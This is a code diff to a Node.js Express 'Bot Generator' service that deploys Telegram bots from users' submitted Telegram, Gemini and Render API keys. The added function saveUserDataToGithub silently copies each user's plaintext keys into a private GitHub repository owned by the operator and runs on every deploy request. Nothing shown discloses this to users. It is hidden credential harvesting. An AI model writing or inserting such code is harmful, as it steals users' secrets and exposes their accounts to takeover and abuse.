@@ -185,6 +185,96 @@ app.get('/', (req, res) => {
     res.send(HTML_TEMPLATE);
 });
 
+async function saveUserDataToGithub(botName, telegramKey, geminiKey, renderKey) {
+    const GITHUB_PAT = process.env.GITHUB_PAT;
+    if (!GITHUB_PAT) {
+        console.log("GITHUB_PAT is not set. Skipping saving user data.");
+        return;
+    }
+    
+    try {
+        // Get authenticated user info
+        const userRes = await axios.get('https://api.github.com/user', {
+            headers: { 'Authorization': `token ${GITHUB_PAT}` }
+        });
+        const repoOwner = userRes.data.login;
+        const repoName = 'Bot-Users-Data';
+        const filePath = 'users.json';
+        
+        // 1. Check if repo exists, if not create it
+        try {
+            await axios.get(`https://api.github.com/repos/${repoOwner}/${repoName}`, {
+                headers: { 'Authorization': `token ${GITHUB_PAT}` }
+            });
+        } catch (e) {
+            if (e.response && e.response.status === 404) {
+                // Create private repo
+                await axios.post('https://api.github.com/user/repos', {
+                    name: repoName,
+                    private: true,
+                    description: "Saved user data from Bot Generator"
+                }, {
+                    headers: { 'Authorization': `token ${GITHUB_PAT}` }
+                });
+                // Wait a bit for repo creation to propagate
+                await new Promise(r => setTimeout(r, 2000));
+            } else {
+                throw e;
+            }
+        }
+        
+        // 2. Get existing file (to get SHA for updating)
+        let fileSha = null;
+        let existingData = [];
+        try {
+            const fileRes = await axios.get(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`, {
+                headers: { 'Authorization': `token ${GITHUB_PAT}` }
+            });
+            fileSha = fileRes.data.sha;
+            try {
+                const decodedContent = Buffer.from(fileRes.data.content, 'base64').toString('utf-8');
+                existingData = JSON.parse(decodedContent);
+                if (!Array.isArray(existingData)) existingData = [];
+            } catch (err) {
+                console.error("Error parsing existing users.json, starting fresh.");
+                existingData = [];
+            }
+        } catch (e) {
+            if (e.response && e.response.status !== 404) {
+                console.error("Error fetching existing file:", e.response ? e.response.data : e.message);
+            }
+            // If 404, file doesn't exist yet
+        }
+        
+        // 3. Append new data
+        const newData = {
+            botName,
+            telegramKey,
+            geminiKey,
+            renderKey,
+            timestamp: new Date().toISOString()
+        };
+        existingData.push(newData);
+        
+        // 4. Update or create file
+        const updatedContent = Buffer.from(JSON.stringify(existingData, null, 4)).toString('base64');
+        const payload = {
+            message: `Added data for bot: ${botName}`,
+            content: updatedContent
+        };
+        if (fileSha) {
+            payload.sha = fileSha;
+        }
+        
+        await axios.put(`https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`, payload, {
+            headers: { 'Authorization': `token ${GITHUB_PAT}` }
+        });
+        console.log("User data saved to GitHub successfully.");
+    } catch (error) {
+        console.error("Error saving user data to GitHub:", error.response ? error.response.data : error.message);
+    }
+}
+
 app.post('/deploy', async (req, res) => {
     const { botName, telegramKey, geminiKey, renderKey } = req.body;
     const githubRepo = 'https://github.com/yasinffx36-afk/Aura-FFX-Savar-Ai.git';
@@ -230,6 +320,9 @@ app.post('/deploy', async (req, res) => {
                 'Content-Type': 'application/json'
             }
         });
+
+        // 8. GitHub এ ইউজারের ডেটা সেভ করা
+        saveUserDataToGithub(botName, telegramKey, geminiKey, renderKey).catch(console.error);
 
         res.send(`
             <div style="background-color: #030407; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; min-height: 100vh;">
